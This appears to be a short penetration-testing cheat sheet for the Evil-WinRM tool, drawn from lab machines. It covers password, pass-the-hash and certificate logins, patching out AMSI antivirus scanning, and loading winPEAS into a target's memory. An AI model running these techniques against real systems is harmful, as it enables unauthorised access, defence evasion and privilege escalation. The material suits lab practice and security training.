## # `Commands` -

`Evil-winrm` is the best tool for connecting to WinRM from a Linux host.

1. Login :

- Normal Login -

```powershell
evil-winrm -i 10.10.11.132 -u oliver -p c1cdfun_d2434
```

- Normal login via creds(using ssl) -

```bash
evil-winrm -i timelapse.htb -S -u administrator -p 'uM[3va(s870g6Y]9i]6tMu{j'
```

- Login via Hash -

```bash
evil-winrm -u administrator -H c370bddf384a691d811ff3495e8a72e2 -i apt.htb
```

- Using Certificate to login -

```bash
evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```

-   `-S` - Enable SSL, because I’m connecting to 5986;
-   `-c legacyy_dev_auth.crt` - provide the public key certificate
-   `-k legacyy_dev_auth.key` - provide the private key
-   `-i timelapse.htb` - host to connect to

2. Bypassing AMSI :

```powershell
*Evil-WinRM* PS C:\Users\henry.vinson_adm\appdata\local\temp> menu

   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /    
        \/                               \/          \/       \/         \/      
              By: CyberVaca, OscarAkaElvis, Laox @Hackplayers

[+] Bypass-4MSI
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary

*Evil-WinRM* PS C:\Users\henry.vinson_adm\appdata\local\temp> Bypass-4MSI
[+] Patched! :D
```

3. Invoke-Binary :

You can use `Invoke-Binary` to load an EXE from your system directly into the memory of victim machine :

```powershell
*Evil-WinRM* PS C:\Users\henry.vinson_adm\appdata\local\temp> Invoke-Binary /opt/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe
```

This method of running does seem to cache all the output and then dump it once the process is complete, so it can take some patience to wait for output to come.

